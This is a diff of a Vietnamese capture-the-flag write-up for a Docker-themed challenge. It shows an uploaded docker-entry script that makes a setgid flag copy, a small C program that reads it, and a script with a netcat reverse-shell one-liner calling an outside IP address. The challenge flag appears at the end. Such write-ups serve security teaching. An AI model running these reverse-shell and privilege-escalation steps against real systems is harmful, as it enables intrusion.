@@ -44,24 +44,32 @@
 - Tôi tìm thầy file này trong source leak ra và nó xử lí file docker-entry 
 ![image](https://user-images.githubusercontent.com/82523299/188442154-b0e91ad7-80b2-496c-bcdb-36cb0867038c.png)
 
-- Tôi upload một file docker-entry
-- ![image](https://user-images.githubusercontent.com/82523299/188442375-9e476321-b864-4427-b75e-6f93707a0fd3.png)
-- File này sẽ copy bash vào thư mục data và thiết lập setgid và thực thi shell với egid=1000 
-- Sau đó up script dưới dạng file ./run để nhận flag là xong
-
+-File docker-entry2
 ```
 #!/usr/bin/bash
+cp flag flag2
+chmod 777 flag2
+chmod g+s flag2
+mv docker-entry docker-entry3
+```
+- File flag.c
+```
+int main(void) {
+    execl("/usr/bin/cat", "cat", "../../flag2", 0);
+}
+```
+- File rin script
+```
+#!/usr/bin/bash
+gcc -o flag flag.c
 rm /tmp/f
 mkfifo /tmp/f
-cat /tmp/f|sh -i 2>&1|nc 102.122.100.112 1000 >/tmp/f
+cat /tmp/f|sh -i 2>&1|nc 113.119.181.211 1000 >/tmp/f
 ```
-
-```
-$cat ../../flag2
-BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}
+- Nén 3 file trên vào zip rồi up lên sau đó nc ngồi đợi server
+- Đổi tên file docker-entry2  thành docker-entry, để server thực thi docker-entry sau đó sẽ gán quyền egid=1000 cho file thực thi flag2
+- Cuối cùng là ./flag2 và có flag.
 ![image](https://user-images.githubusercontent.com/82523299/188469974-a4c53d99-5f8d-4ea7-8eb8-ef6a55677d72.png)
-
-```
 ![image](https://user-images.githubusercontent.com/82523299/188470169-d81c2569-cec4-4682-b305-bfecf665377f.png)
 
 #### FLAG: BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}
